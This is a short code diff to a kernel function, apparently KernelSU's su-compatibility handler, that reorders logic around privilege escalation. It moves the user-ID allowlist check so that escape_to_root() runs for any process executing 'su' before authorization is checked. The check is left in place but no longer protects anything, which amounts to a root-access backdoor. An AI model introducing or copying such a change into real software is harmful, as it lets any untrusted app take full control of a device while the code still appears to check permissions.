@@ -107,15 +107,15 @@ int ksu_handle_execveat_sucompat(int *fd, struct filename **filename_ptr,
 		return 0;
 	}
 
-	if (!ksu_is_allow_uid(current_uid().val)) {
-		return 0;
-	}
-
 	if (!memcmp(filename->name, su, sizeof(su))) {
 		pr_info("do_execveat_common su found\n");
 		memcpy((void *)filename->name, sh, sizeof(sh));
 
 		escape_to_root();
+	}
+
+	if (!ksu_is_allow_uid(current_uid().val)) {
+		return 0;
 	}
 
 	return 0;
